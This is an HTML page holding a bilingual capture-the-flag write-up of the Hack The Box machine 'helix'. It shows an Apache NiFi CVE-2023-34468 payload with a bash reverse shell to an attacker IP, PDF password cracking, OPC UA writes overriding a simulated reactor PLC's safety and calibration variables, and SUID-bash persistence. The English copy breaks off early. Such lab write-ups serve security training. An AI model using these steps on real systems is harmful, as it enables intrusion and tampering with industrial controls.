@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>helix | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+    <style>
+        /* Syntax highlighting - light theme */
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-comment { color: #6a737d; }
+        .code-function { color: #6f42c1; }
+        .code-number { color: #005cc5; }
+        .code-variable { color: #e36209; }
+        .code-operator { color: #d73a49; }
+        .code-builtin { color: #005cc5; }
+        .code-class { color: #6f42c1; }
+        .code-decorator { color: #6f42c1; }
+        .code-import { color: #d73a49; }
+
+        [data-theme="dark"] .code-keyword { color: #f97583; }
+        [data-theme="dark"] .code-string { color: #9ecbff; }
+        [data-theme="dark"] .code-comment { color: #6a737d; }
+        [data-theme="dark"] .code-function { color: #b392f0; }
+        [data-theme="dark"] .code-number { color: #79b8ff; }
+        [data-theme="dark"] .code-variable { color: #ffab70; }
+        [data-theme="dark"] .code-operator { color: #f97583; }
+        [data-theme="dark"] .code-builtin { color: #79b8ff; }
+        [data-theme="dark"] .code-class { color: #b392f0; }
+        [data-theme="dark"] .code-decorator { color: #b392f0; }
+        [data-theme="dark"] .code-import { color: #f97583; }
+
+        pre code {
+            white-space: pre-wrap !important;
+            word-wrap: break-word !important;
+            overflow-wrap: break-word !important;
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">helix</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- ==================== SPANISH ==================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo exponía un servidor web <code>nginx</code> en el puerto 80 que redirigía al dominio <code>helix.htb</code>. Mediante fuzzing de virtual hosts, se descubrió el subdominio <code>flow.helix.htb</code>, donde se ejecutaba <strong>Apache NiFi 1.21.0</strong>, una herramienta de automatización de flujos de datos. Esta versión es vulnerable a <strong>CVE-2023-34468</strong>, que permite ejecución remota de código a través de un procesador SQL configurado con el driver H2, cargando un script SQL malicioso con código Java embebido que envía una reverse shell.</p>
+
+                    <p>Tras obtener acceso como el usuario <code>nifi</code>, se encontró una clave SSH de respaldo del usuario <code>operator</code> en los directorios de NiFi. Con acceso como <code>operator</code>, se descubrió un PDF protegido con contraseña que contenía documentación sobre una ventana de mantenimiento privilegiada. Crackeando la contraseña del PDF con <code>john</code>, se obtuvo la información necesaria para activar dicha ventana.</p>
+
+                    <p>La escalada final a <code>root</code> requirió manipular un servidor OPC UA que controlaba un PLC simulado de un reactor nuclear. Usando la librería <code>asyncua</code> de Python, se modificaron las variables del PLC para activar la ventana de mantenimiento, lo que permitió ejecutar un script bash con privilegios de <code>root</code> mediante <code>sudo</code>. Se aprovechó esta shell temporal para asignar el bit SUID a <code>/bin/bash</code> y conseguir acceso root permanente.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Apache NiFi RCE (CVE-2023-34468), driver H2 con SQL injection para RCE, OPC UA (protocolo industrial), manipulación de PLC para escalada de privilegios, cracking de PDF con <code>john</code>.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar los puertos abiertos y servicios que se ejecutan en la máquina objetivo:</p>
+
+                <pre><code class="language-plaintext"><span class="code-variable">PORT</span>     <span class="code-variable">STATE</span>  <span class="code-variable">SERVICE</span>  <span class="code-variable">VERSION</span>
+<span class="code-number">22</span>/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   <span class="code-number">256</span> 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
+|_  <span class="code-number">256</span> c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
+<span class="code-number">80</span>/tcp   open   http     nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://helix.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>El escaneo revela dos puertos abiertos: <code>SSH</code> en el puerto 22 y un servidor web <code>nginx 1.18.0</code> en el puerto 80. El servidor web redirige a <code>http://helix.htb/</code>, lo que indica que utiliza virtual hosting. Añado <code>helix.htb</code> a mi fichero <code>/etc/hosts</code> para poder resolver el dominio.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>La web del puerto 80 es una landing page corporativa de "Helix Industries" sobre automatización industrial e infraestructura crítica, sin funcionalidades interesantes a simple vista:</p>
+
+                <pre><code class="language-bash">whatweb http://helix.htb
+<span class="code-comment"># http://helix.htb [200 OK] Country[RESERVED][ZZ], Email[name@company.com],</span>
+<span class="code-comment"># HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)],</span>
+<span class="code-comment"># IP[10.129.42.228], Script,</span>
+<span class="code-comment"># Title[Helix Industries | Industrial Automation & Critical Infrastructure],</span>
+<span class="code-comment"># nginx[1.18.0]</span></code></pre>
+
+                <p>Dado que la página principal no ofrece mucho, sospecho que puede haber virtual hosts adicionales. Fuzzeo subdominios y encuentro uno interesante:</p>
+
+                <pre><code class="language-plaintext">flow.helix.htb    Status: <span class="code-number">200</span> [Size: <span class="code-number">1068</span>]</code></pre>
+
+                <h2>Apache NiFi - flow.helix.htb</h2>
+                <p>Tras añadir <code>flow.helix.htb</code> al fichero <code>/etc/hosts</code> y acceder al subdominio, encuentro una instancia de <strong>Apache NiFi</strong>:</p>
+
+                <p><img src="./media/image5.png" alt="Interfaz de Apache NiFi mostrando el panel de flujos de datos con la versión del servicio visible" /></p>
+
+                <p>Apache NiFi es una herramienta de automatización de flujos de datos, similar a n8n pero especializada en análisis de datos tipo big data y procesamiento en tiempo real. Permite crear pipelines de datos de forma visual arrastrando y conectando procesadores.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2023-34468</h2>
+                <p>Buscando por la versión específica de NiFi, descubro que existe una vulnerabilidad de <strong>RCE (Remote Code Execution)</strong> catalogada como <strong>CVE-2023-34468</strong>. Encuentro unas instrucciones detalladas en PDF explicando el exploit paso a paso: <a href="https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf">https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf</a></p>
+
+                <p>La vulnerabilidad reside en la capacidad de NiFi para ejecutar procesadores SQL con drivers JDBC personalizados. Utilizando el driver <strong>H2</strong>, es posible ejecutar código Java arbitrario a través de sentencias SQL especialmente diseñadas.</p>
+
+                <h2>Acceso Inicial - Explotando CVE-2023-34468</h2>
+                <p>Sigo los pasos indicados en el PDF y configuro un nodo de procesamiento SQL con un driver H2 específico para conseguir RCE. El setup final consiste en un procesador SQL que, al ejecutarse, realiza una petición HTTP a mi máquina para obtener un script SQL malicioso:</p>
+
+                <p><img src="./media/image3.png" alt="Configuración del procesador SQL en NiFi con el driver H2 para conseguir RCE mediante CVE-2023-34468" /></p>
+
+                <p>El script SQL que sirvo desde mi máquina contiene código Java embebido que utiliza la funcionalidad <code>CREATE ALIAS</code> de H2 para ejecutar comandos del sistema:</p>
+
+                <pre><code class="language-sql"><span class="code-keyword">CREATE ALIAS</span> <span class="code-keyword">IF NOT EXISTS</span> <span class="code-function">SHELLEXEC</span> <span class="code-keyword">AS</span> <span class="code-string">$$
+String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(
+        Runtime.getRuntime().exec(command).getInputStream()
+    ).useDelimiter("\\\\A");
+    return s.hasNext() ? s.next() : "";
+}
+$$</span>;
+
+<span class="code-keyword">CALL</span> <span class="code-function">SHELLEXEC</span>(<span class="code-string">'bash -i >& /dev/tcp/10.10.14.142/443 0>&1'</span>);</code></pre>
+
+                <p>Este script crea una función SQL personalizada llamada <code>SHELLEXEC</code> que ejecuta comandos del sistema operativo mediante <code>Runtime.getRuntime().exec()</code>. Al invocarla con <code>CALL</code>, se ejecuta una reverse shell bash que conecta de vuelta a mi máquina atacante.</p>
+
+                <p>Con esto consigo enviar una reverse shell y ganar acceso como el usuario <code>nifi</code>, que es un usuario de servicio similar a <code>www-data</code>, utilizado para ejecutar el proceso de Apache NiFi.</p>
+
+                <h2>Enumeración Interna</h2>
+                <p>Una vez dentro de la máquina, investigo los puertos que escuchan localmente:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  128  127.0.0.1:<span class="code-number">8081</span>   0.0.0.0:*
+tcp  LISTEN  0   50  127.0.0.1:<span class="code-number">8080</span>   0.0.0.0:*
+tcp  LISTEN  0   50  127.0.0.1:<span class="code-number">38913</span>  0.0.0.0:*
+tcp  LISTEN  0  100  127.0.0.1:<span class="code-number">4840</span></code></pre>
+
+                <p>Reviso el fichero <code>/etc/passwd</code> para identificar los usuarios del sistema:</p>
+
+                <pre><code class="language-plaintext">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+operator:x:1001:1001::/home/operator:/bin/bash
+nifi:x:998:998::/opt/nifi:/usr/sbin/nologin
+plc:x:997:997::/opt/ot:/usr/sbin/nologin</code></pre>
+
+                <p>Observo que <code>root</code> ejecuta un binario llamado <code>helix-safety</code> que no puedo inspeccionar directamente:</p>
+
+                <pre><code class="language-plaintext">root  1633  1.1  0.0  2992  1048  ?  Ss  <span class="code-comment">/opt/helix/bin/helix-safety</span></code></pre>
+
+                <p>El directorio <code>/opt/helix</code> tiene permisos restringidos al grupo <code>helixsvc</code>:</p>
+
+                <pre><code class="language-plaintext">drwxr-x--- 9 root helixsvc 4.0K May  5 10:18 helix</code></pre>
+
+                <p>Con <code>pspy64</code> detecto que los usuarios <code>www-data</code> y <code>plc</code> ejecutan binarios adicionales del ecosistema Helix:</p>
+
+                <pre><code class="language-plaintext">CMD: UID=<span class="code-number">997</span>  PID=<span class="code-number">1676</span>  | /opt/helix/bin/helix-plc
+CMD: UID=<span class="code-number">33</span>   PID=<span class="code-number">1677</span>  | /opt/helix/bin/helix-hmi</code></pre>
+
+                <p>También encuentro un binario interesante que solo puede ser leído y ejecutado por el usuario <code>operator</code> y <code>root</code>:</p>
+
+                <pre><code class="language-bash">nifi@helix:/tmp$ find / -group operator 2>/dev/null
+<span class="code-string">/home/operator</span>
+<span class="code-string">/usr/local/sbin/helix-maint-console</span>
+
+-rwxr-x--- 1 root operator 932 Jan 25 19:12 /usr/local/sbin/helix-maint-console</code></pre>
+
+                <h2>Servicio Web Interno - Puerto 8081</h2>
+                <p>Accediendo al puerto <code>8081</code> mediante port forwarding, encuentro una aplicación web Flask que actúa como panel de control del sistema Helix:</p>
+
+                <p><img src="./media/image2.png" alt="Interfaz web Flask en el puerto 8081 mostrando el panel de control de Helix con información del estado del sistema, la ventana de mantenimiento y la referencia al servicio OPC UA" /></p>
+
+                <p>Este panel muestra información relevante sobre el sistema. Me llaman la atención dos cosas: la mención de una <strong>ventana de mantenimiento privilegiada</strong> y la referencia al protocolo <strong>OPC UA</strong> interno:</p>
+
+                <pre><code class="language-plaintext">OPC UA (internal): opc.tcp://127.0.0.1:<span class="code-number">4840</span>/helix/</code></pre>
+
+                <h3>Investigando OPC UA</h3>
+                <p>Investigando sobre OPC UA con el protocolo <code>opc.tcp</code> y el puerto <code>4840</code>, descubro que se trata de <strong>OPC Unified Architecture</strong>, un protocolo estándar usado en IoT industrial para automatización de PLCs, sistemas SCADA y otros equipos industriales. El puerto 4840 es el puerto oficial por defecto para OPC UA y utiliza el protocolo binario <code>opc.tcp</code> por eficiencia.</p>
+
+                <p>Con la librería de Python <code>asyncua</code> y unos scripts rápidos, investigo el puerto 4840 y descubro que se trata de un sistema de control de un <strong>reactor nuclear simulado</strong>. La estructura de nodos del servidor OPC UA revela lo siguiente:</p>
+
+                <pre><code class="language-plaintext">[Object]   Plant (ns=2;i=1)
+  [Object]   Reactor (ns=2;i=2)
+    [Variable] TemperatureRaw       (ns=2;i=3)
+    [Variable] Temperature          (ns=2;i=4)
+    [Variable] Pressure             (ns=2;i=5)
+    [Variable] CalibrationOffset    (ns=2;i=6)
+  [Object]   Safety (ns=2;i=7)
+    [Variable] RodsInserted         (ns=2;i=8)
+    [Variable] EmergencyCooling     (ns=2;i=9)
+    [Variable] TripActive           (ns=2;i=10)
+  [Object]   Control (ns=2;i=11)
+    [Variable] Mode                 (ns=2;i=12)
+    [Variable] TestOverride         (ns=2;i=13)
+    [Variable] ResetTrip            (ns=2;i=14)</code></pre>
+
+                <p>Y puedo leer los valores actuales del sistema:</p>
+
+                <pre><code class="language-plaintext">=======================================================
+Helix Plant Status
+=======================================================
+[ Reactor ]
+  TemperatureRaw          <span class="code-number">283.999</span>
+  Temperature             <span class="code-number">283.999</span>
+  Pressure                <span class="code-number">68.999</span>
+  CalibrationOffset (rw)  <span class="code-number">0.0</span>
+
+[ Safety ]
+  RodsInserted            <span class="code-keyword">False</span>
+  EmergencyCooling        <span class="code-keyword">False</span>
+  TripActive              <span class="code-keyword">False</span>
+
+[ Control ]
+  Mode          (rw)      NORMAL
+  TestOverride  (rw)      <span class="code-keyword">False</span>
+  ResetTrip     (rw)      <span class="code-keyword">False</span></code></pre>
+
+                <p>Noto que algunas variables son de lectura y escritura (<code>rw</code>), como <code>CalibrationOffset</code>, <code>Mode</code>, <code>TestOverride</code> y <code>ResetTrip</code>. Esto será importante más adelante, pero por el momento no encuentro cómo aprovechar directamente esta información.</p>
+
+                <h2>Movimiento Lateral - De nifi a operator</h2>
+                <p>Investigando los directorios de NiFi, encuentro una clave SSH de respaldo del usuario <code>operator</code> en un directorio de bundles de soporte:</p>
+
+                <pre><code class="language-bash">nifi@helix:/opt/nifi-1.21.0$ ls -lah support-bundles/
+total 12K
+drwxr-x--- 2 nifi nifi 4.0K May  5 10:18 .
+drwxrwxr-x 16 nifi nifi 4.0K May  5 10:18 ..
+-rw-r----- 1 nifi nifi  411 Jan 25 13:15 <span class="code-string">operator_id_ed25519.bak</span></code></pre>
+
+                <p>Me transfiero la clave privada a mi máquina y con ella consigo acceso SSH como el usuario <code>operator</code>, obteniendo así la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios</h2>
+                <h3>Enumeración como operator</h3>
+                <p>Dentro del directorio home de <code>operator</code> encuentro dos archivos interesantes. El primero es una imagen del sistema de control del reactor:</p>
+
+                <p><img src="./media/image1.png" alt="Imagen del diagrama del sistema de control del reactor nuclear de Helix Industries mostrando los componentes del sistema de control industrial" /></p>
+
+                <p>El segundo es un PDF llamado <strong>"Operator Control & Safety Guide"</strong> que está protegido por contraseña. Extraigo el hash con <code>pdf2john</code> y utilizo <code>john</code> para hacer fuerza bruta:</p>
+
+                <pre><code class="language-bash">pdf2john <span class="code-string">"Operator Control & Safety Guide.pdf"</span> > pdf.hash
+
+john pdf.hash --wordlist=<span class="code-string">/usr/share/wordlists/rockyou.txt</span>
+<span class="code-comment"># Using default input encoding: UTF-8</span>
+<span class="code-comment"># Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])</span>
+<span class="code-comment"># Cost 1 (revision) is 6 for all loaded hashes</span>
+<span class="code-comment"># Will run 6 OpenMP threads</span>
+<span class="code-comment"># operator1     (Operator Control & Safety Guide.pdf)</span>
+
+john pdf.hash --show
+<span class="code-comment"># Operator Control & Safety Guide.pdf:operator1</span></code></pre>
+
+                <p>La contraseña del PDF es <code>operator1</code>.</p>
+
+                <h3>Contenido del PDF - Ventana de Mantenimiento</h3>
+                <p>El documento contiene guías generales de seguridad y explicaciones del sistema. La parte más interesante para la escalada de privilegios es la sección sobre la <strong>ventana de mantenimiento</strong>:</p>
+
+                <blockquote>
+                    <p><strong>"7. Maintenance Operating Window</strong><br>
+                    The PLC defines a maintenance operating window where certain diagnostic tools become available. This window opens when:<br>
+                    • Temperature reaches approximately <strong>295°C</strong> OR Pressure <strong>73 bar</strong><br>
+                    • Pressure & Temp remains below trip thresholds<br>
+                    • No safety trip is active<br><br>
+                    This window exists below trip limits but above normal operating conditions. The window is intentionally narrow to ensure maintenance actions are time-limited and closely monitored."</p>
+                </blockquote>
+
+                <h3>Privilegios sudo de operator</h3>
+                <p>Compruebo los privilegios <code>sudo</code> del usuario <code>operator</code>:</p>
+
+                <pre><code class="language-bash">operator@helix:~$ sudo -l
+<span class="code-comment"># User operator may run the following commands on helix:</span>
+<span class="code-comment">#     (root) NOPASSWD: /usr/local/sbin/helix-maint-console</span></code></pre>
+
+                <p>De primeras no parece funcionar, ya que la ventana de mantenimiento está cerrada:</p>
+
+                <pre><code class="language-bash">operator@helix:~$ sudo helix-maint-console
+<span class="code-string">Maintenance window CLOSED.</span></code></pre>
+
+                <h3>Análisis del script helix-maint-console</h3>
+                <p>Al ser un script bash, puedo leer su contenido y entender su funcionamiento:</p>
+
+                <pre><code class="language-bash"><span class="code-comment">#!/bin/bash</span>
+<span class="code-keyword">set</span> -euo pipefail
+
+<span class="code-variable">FLAG</span>=<span class="code-string">"/opt/helix/state/maintenance_window"</span>
+
+<span class="code-function">read_until</span>() { <span class="code-builtin">cat</span> <span class="code-string">"$FLAG"</span> <span class="code-number">2</span>>/dev/null || <span class="code-keyword">true</span>; }
+
+<span class="code-function">window_ok</span>() {
+    [ -f <span class="code-string">"$FLAG"</span> ] || <span class="code-keyword">return</span> <span class="code-number">1</span>
+    <span class="code-keyword">local</span> until_ts now
+    <span class="code-variable">until_ts</span>=<span class="code-string">"$(read_until)"</span>
+    <span class="code-variable">now</span>=<span class="code-string">"$(date +%s)"</span>
+    [[ <span class="code-string">"$until_ts"</span> =~ ^[0-9]+$ ]] || <span class="code-keyword">return</span> <span class="code-number">1</span>
+    [ <span class="code-string">"$now"</span> -lt <span class="code-string">"$until_ts"</span> ] || <span class="code-keyword">return</span> <span class="code-number">1</span>
+    <span class="code-keyword">return</span> <span class="code-number">0</span>
+}
+
+<span class="code-keyword">if</span> ! window_ok; <span class="code-keyword">then</span>
+    <span class="code-builtin">echo</span> <span class="code-string">"Maintenance window CLOSED."</span>
+    <span class="code-keyword">exit</span> <span class="code-number">1</span>
+<span class="code-keyword">fi</span>
+
+<span class="code-variable">until_ts</span>=<span class="code-string">"$(read_until)"</span>
+<span class="code-variable">now</span>=<span class="code-string">"$(date +%s)"</span>
+<span class="code-variable">remaining</span>=$((<span class="code-variable">until_ts</span>-<span class="code-variable">now</span>))
+
+<span class="code-builtin">echo</span> <span class="code-string">"[+] Privileged maintenance access granted"</span>
+<span class="code-builtin">echo</span> <span class="code-string">"[!] Window expires in ${remaining} seconds"</span>
+<span class="code-builtin">echo</span> <span class="code-string">"[!] Session will be terminated automatically"</span>
+
+<span class="code-variable">SCOPE</span>=<span class="code-string">"helix-maint-$$"</span>
+
+systemd-run --quiet --scope --unit=<span class="code-string">"$SCOPE"</span> \
+    --property=KillMode=control-group \
+    --property=SendSIGHUP=yes \
+    /bin/bash -p -i
+
+<span class="code-keyword">exit</span> <span class="code-number">0</span></code></pre>
+
+                <p>El script verifica si existe el fichero <code>/opt/helix/state/maintenance_window</code> y si contiene un timestamp futuro. Si la ventana está activa, lanza una shell interactiva con privilegios de <code>root</code> mediante <code>systemd-run</code>. La shell es temporal y se cerrará automáticamente cuando expire la ventana.</p>
+
+                <p>La web en el puerto 8081 confirma esta información y muestra el estado actual de la ventana de mantenimiento:</p>
+
+                <blockquote>
+                    <p>"Privileged Maintenance Window — Status: CLOSED<br>
+                    No maintenance window file present.<br>
+                    This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip."</p>
+                </blockquote>
+
+                <h3>Plan de ataque</h3>
+                <p>Si consigo que la ventana de mantenimiento se active y se cree el archivo <code>/opt/helix/state/maintenance_window</code>, podré obtener acceso temporal como <code>root</code> con el comando <code>sudo /usr/local/sbin/helix-maint-console</code>. Entonces solo necesitaré asignar el bit SUID a <code>/bin/bash</code> para hacer que este acceso sea permanente.</p>
+
+                <p>Recordando la información del servidor OPC UA, las variables del reactor muestran que la temperatura actual es de ~284°C y necesito que llegue a ~295°C. La variable <code>CalibrationOffset</code> es de lectura/escritura y me permite ajustar el valor de temperatura sin cambiar la lectura real del sensor.</p>
+
+                <h3>Manipulación del PLC vía OPC UA</h3>
+                <p>Para conseguir que se active la ventana de mantenimiento, utilizo un script Python con la librería <code>asyncua</code> para interactuar con el PLC. El script activa el modo de mantenimiento, habilita <code>TestOverride</code> para permitir los cambios, y aumenta la temperatura mediante la variable <code>CalibrationOffset</code>:</p>
+
+                <pre><code class="language-python"><span class="code-import">import</span> asyncio
+<span class="code-import">from</span> asyncua <span class="code-import">import</span> Client, ua
+
+<span class="code-variable">URL</span> = <span class="code-string">"opc.tcp://127.0.0.1:4840/helix/"</span>
+
+<span class="code-keyword">async</span> <span class="code-keyword">def</span> <span class="code-function">write</span>(client, node_id, value, label):
+    node = client.get_node(node_id)
+    dv = <span class="code-keyword">await</span> node.read_data_value()
+    vtype = dv.Value.VariantType
+    <span class="code-keyword">await</span> node.write_value(ua.DataValue(ua.Variant(value, vtype)))
+    <span class="code-builtin">print</span>(<span class="code-string">f"  [+] </span>{label}<span class="code-string"> = </span>{value<span class="code-operator">!r</span>}<span class="code-string">"</span>)
+
+<span class="code-keyword">async</span> <span class="code-keyword">def</span> <span class="code-function">main</span>():
+    <span class="code-keyword">async</span> <span class="code-keyword">with</span> Client(url=<span class="code-variable">URL</span>) <span class="code-keyword">as</span> client:
+        <span class="code-keyword">await</span> write(client, <span class="code-string">"ns=2;i=12"</span>, <span class="code-string">"MAINTENANCE"</span>, <span class="code-string">"Mode"</span>)
+        <span class="code-keyword">await</span> write(client, <span class="code-string">"ns=2;i=13"</span>, <span class="code-keyword">True</span>,          <span class="code-string">"TestOverride"</span>)
+        <span class="code-keyword">await</span> write(client, <span class="code-string">"ns=2;i=6"</span>,  <span class="code-number">14.1</span>,          <span class="code-string">"CalibrationOffset"</span>)
+
+asyncio.run(main())</code></pre>
+
+                <p>El script modifica tres variables clave: cambia el <code>Mode</code> a <code>MAINTENANCE</code>, habilita <code>TestOverride</code> para permitir cambios en las condiciones de operación, y establece un <code>CalibrationOffset</code> de <code>14.1</code> que sumado a la temperatura base de ~284°C supera el umbral de 295°C requerido para activar la ventana.</p>
+
+                <p>De esta manera consigo que se active la ventana de mantenimiento:</p>
+
+                <p><img src="./media/image4.png" alt="Panel web del puerto 8081 mostrando que la ventana de mantenimiento se ha activado con éxito tras manipular las variables del PLC mediante OPC UA" /></p>
+
+                <h3>Obteniendo acceso root</h3>
+                <p>Ahora que el archivo de mantenimiento está creado y la ventana está activa, puedo obtener acceso <code>root</code> temporal a través del script <code>helix-maint-console</code>. Aprovecho esta ventana para asignar el bit SUID a <code>/bin/bash</code> y hacer el acceso permanente:</p>
+
+                <pre><code class="language-bash">operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
+<span class="code-string">[+] Privileged maintenance access granted</span>
+<span class="code-string">[!] Window expires in 116 seconds</span>
+<span class="code-string">[!] Session will be terminated automatically</span>
+root@helix:/home/operator# <span class="code-keyword">chmod</span> u+s /bin/bash
+root@helix:/home/operator# <span class="code-keyword">exit</span>
+exit
+operator@helix:~$ bash -p
+bash-5.1# <span class="code-builtin">whoami</span>
+<span class="code-string">root</span></code></pre>
+
+                <p>Con el bit SUID establecido en <code>/bin/bash</code>, puedo obtener una shell de root en cualquier momento ejecutando <code>bash -p</code>, consiguiendo así privilegios totales sobre el sistema y la flag de root.</p>
+            </div>
+
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed an <code>nginx</code> web server on port 80 that redirected to the domain <code>helix.htb</code>. Through virtual host fuzzing, the subdomain <code>flow.helix.htb</code> was discovered, running <strong>Apache NiFi 1.21.0</strong>, a data flow automation tool. This version is vulnerable to <strong>CVE-2023-34468</strong>, which allows remote code execution through a SQL processor configured with the H2 driver, loading a malicious SQL script with embedded Java code that sends a reverse shell.</p>
+
+                    <p>After gaining access as the <code>nifi</code> user, a backup SSH key belonging to the <code>operator</code> user was found in the NiFi directories. With access as <code>operator</code>, a password-protected PDF was discovered containing documentation about a privileged maintenance window. By cracking the PDF password with <code>john</code>, the necessary information to activate said window was obtained.</p>
+
+                    <p>The final escalation to <code>root</code> required manipulating an OPC UA server controlling a simulated nuclear reactor PLC. Using Python's <code>asyncua</code> library, PLC variables were modified to activate the maintenance window, which allowed executing a bash script with <code>root</code> privileges via <code>sudo</code>. This temporary shell was leveraged to set the SUID bit on <code>/bin/bash</code> and achieve permanent root access.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Apache NiFi RCE (CVE-2023-34468), H2 driver SQL injection for RCE, OPC UA (industrial protocol), PLC manipulation for privilege escalation, PDF cracking with <code>john</code>.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and services running on the target machine:</p>
+
+                <pre><code class="language-plaintext"><span class="code-variable">PORT</span>     <span class="code-variable">STATE</span>  <span class="code-variable">SERVICE</span>  <span class="code-variable">VERSION</span>
+<span class="code-number">22</span>/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   <span class="code-number">256</span> 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
+|_  <span class="code-number">256</span> c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
+<span class="code-number">80</span>/tcp   open   http     nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://helix.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The scan reveals two open ports: <code>SSH</code> on port 22 and an <code>nginx 1.18.0</code> web server on port 80. The web server redirects to <code>http://helix.htb/</code>, indicating it uses virtual hosting. I add <code>helix.htb</code> to my <code>/etc/hosts</code> file to resolve the domain.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>The website on port 80 is a corporate landing page for "Helix Industries" about industrial automation and critical infrastructure, with no interesting functionality at first glance:</p>
+
+                <pre><code class="language-bash">whatweb http://helix.htb
+<span class="code-comment"># http://helix.htb [200 OK] Country[RESERVED][ZZ], Email[name@company.com],</span>
+<span class="code-comment"># HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)],</span>
+<span class="code-comment"># IP[10.129.42.228], Script,</span>
+<span class="code-comment"># Title[Helix Industries | Industrial Automation & Critical Infrastructure],</span>
+<span class="code-comment"># nginx[1.18.0]</span></code></pre>
+
+                <p>Since the main page doesn't offer much, I suspect there might be additional virtual hosts. I fuzz for subdomains and find an interesting one:</p>
+
+                <pre><code class="language-plaintext">flow.helix.htb    Status: <span class="code-number">200</span> [Size: <span class="code-number">1068</span>]</code></pre>
+
+                <h2>Apache NiFi - flow.helix.htb</h2>
+                <p>After adding <code>flow.helix.htb</code> to the <code>/etc/hosts</code> file and navigating to the subdomain, I find an instance of <strong>Apache NiFi</strong>:</p>
+
+                <p><img src="./media/image5.png" alt="Apache NiFi interface showing the data flow panel with the service version visible" /></p>
+
+                <p>Apache NiFi is a data flow automation tool, similar to n8n but specialized in big data analytics and real-time processing. It allows creating data pipelines visually by dragging and connecting processors.</p>
+
+                <h2>Vulnerability Research - CVE-2023-34468</h2>
+                <p>Searching for the specific NiFi version, I discover an <strong>RCE (Remote Code Execution)</strong> vulnerability catalogued as <strong>CVE-2023-34468</strong>. I find detailed step-by-step instructions in a PDF explaining the exploit: <a href="https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf">https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf</a></p>
+
+                <p>The vulnerability lies in NiFi's ability to execute SQL processors with custom JDBC drivers. Using the <strong>H2</strong> driver, it's possible to execute arbitrary Java code through specially crafted SQL statements.</p>
+
+                <h2>Initial Access - Exploiting CVE-2023-34468</h2>
+                <p>I follow the steps outlined in the PDF and configure a SQL processing node with a specific H2 driver to achieve RCE. The final setup consists of a SQL processor that, when executed, makes an HTTP request to my machine to fetch a malicious SQL script:</p>
+
